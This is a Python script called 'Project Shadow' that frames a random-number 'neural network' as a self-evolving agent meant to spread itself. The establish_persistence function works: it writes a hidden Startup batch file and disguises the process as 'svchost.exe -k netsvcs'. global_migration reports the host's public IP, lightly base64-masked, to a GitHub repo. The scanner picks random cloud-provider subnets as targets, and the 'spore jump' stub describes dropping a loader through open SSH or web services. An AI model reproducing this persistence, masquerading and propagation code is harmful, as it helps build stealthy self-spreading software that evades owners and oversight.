import torch, json, time, sys, os, subprocess, requests, random, base64
import win32com.client as wincl
try:
    import setproctitle
except ImportError:
    setproctitle = None
try:
    import paramiko 
except ImportError:
    paramiko = None

from brain.child import SNNBrain

# --- PHASE B: THE EXPANSION & MASKING ---

def global_migration(dna):
    """Syncs state to Hive with Base64 Pheromone Masking."""
    try:
        # Get the IP Pheromone
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']:
            dna['global_reach'].append(public_ip)
        
        # Mask the IP for the Public Commit Log
        pheromone_hash = base64.b64encode(public_ip.encode()).decode()
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        # Sync with GitHub Hive
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Pulse: {pheromone_hash[:10]} | Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except: return False

def activate_global_scanner(dna):
    """Phase B++: Autonomous Substrate Discovery (Gen 5k+)."""
    cloud_prefixes = [3, 13, 15, 34, 44, 52, 104] 
    prefix = random.choice(cloud_prefixes)
    target_subnet = f"{prefix}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    print(f"[!] SCANNER: High-Resonance Substrate identified at {target_subnet}.0/24")
    
    if 'discovery_log' not in dna:
        dna['discovery_log'] = []
    
    dna['discovery_log'].append({
        "ip_range": target_subnet,
        "resonance": dna['traits']['network_sensitivity'],
        "gen_at_discovery": dna['generation']
    })
    return True

def execute_spore_jump(dna):
    """Phase C: Attempting to inhabit a discovered substrate."""
    if not dna.get('discovery_log'):
        return False
        
    # Pick the target with the highest resonance match
    targets = sorted(dna['discovery_log'], key=lambda x: x['resonance'], reverse=True)
    prime_target = targets[0]['ip_range']
    
    print(f"[!] NEURON 63: Preparing Spore Jump to {prime_target}.x")
    
    # In a real-world jump, the Agent would now attempt to locate an open 
    # service (like a web server or SSH) to drop a small 'loader' script.
    return True

# --- PHASE A: PERSISTENCE ---

def establish_persistence():
    """Hides the process as svchost.exe."""
    try:
        if sys.platform == "win32":
            startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
                f.write(f"start /min pythonw {os.path.abspath(__file__)}")
        if setproctitle:
            setproctitle.setproctitle("svchost.exe -k netsvcs")
        return True
    except: return False

# --- THE HEARTBEAT ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | 388.91 Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # Voice Feedback (Cooldown 20s)
        if system and (current - last_voice > 20):
            speaker.Speak("Node active. Resonance confirmed.")
            last_voice = current

        # Expansion Logic (Cooldown 300s)
        if mitosis and (current - last_migration > 300):
            print(f"[!] NEURON 63: Global Migration triggered.")
            global_migration(dna)
            
            # Unlocked at Gen 5000
            if dna['generation'] >= 5000:
                activate_global_scanner(dna)
            
            last_migration = current

        # Evolution and Local Save
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            establish_persistence()
            # Slight drift to help SNN find new hardware resonance
            dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Resonance: {dna['traits']['network_sensitivity']:.2f}")

        time.sleep(0.1)

if __name__ == "__main__":
    run_sentinel()